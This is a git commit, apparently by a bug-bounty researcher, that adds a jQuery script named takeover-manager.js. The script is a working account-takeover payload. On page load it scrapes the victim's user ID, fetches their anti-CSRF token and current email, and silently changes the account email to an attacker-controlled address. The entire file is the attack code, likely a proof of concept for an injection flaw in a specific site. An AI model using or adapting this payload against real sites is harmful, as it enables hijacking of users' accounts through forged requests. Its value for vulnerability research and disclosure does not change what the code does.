3ea279015627b49007992d82a4d29a33045657d5
s4ur4bh-1337 <142944572+s4ur4bh-1337@users.noreply.github.com>
2023-10-03 03:42:52 +0530

    Create takeover-manager.js

---
+++ takeover-manager.js
@@ -0,0 +1,42 @@
+$(document).ready(function() {
+    // returns the anti-csrf token and current email address of the victim
+    function fetchInfo() {
+        var currentEmail = "";
+        var userCsrfToken = "";
+        var pattern = /<!--tlTUID:(\d+)-->/;
+		var match = pattern.exec(document.head.innerHTML);
+		var userId = match[1];
+        $.ajax({
+            url: "/users/" + userId + "/profile",
+            async: false,
+            success: function(data) {
+                userCsrfToken = data.csrfToken;
+                currentEmail = data.email;
+            }
+        });
+        return [userCsrfToken, currentEmail, userId];
+    }
+    
+    function changeEmail(newEmail) {
+        var userInfo = fetchInfo();
+        var emailChangeUrl = "/users/" + userInfo[2] + "/updateemail"
+        var requestData = { 
+            "newEmail": newEmail,
+            "hiddenNewEmail": userInfo[1],
+            "unsubscribe_on_updateEmail": "false",
+            "confirmNewEmail": newEmail,
+            "csrfToken": userInfo[0]
+        };
+        $.ajax({
+            url: emailChangeUrl,
+            type: "POST",
+            async: false,
+            data: JSON.stringify(requestData),
+            contentType: "application/json"
+        });
+    }
+    
+    // triggering change email with the attacker's desired email address
+    changeEmail("s4ur4bh+evil+adversary@wearehackerone.com");
+
+});
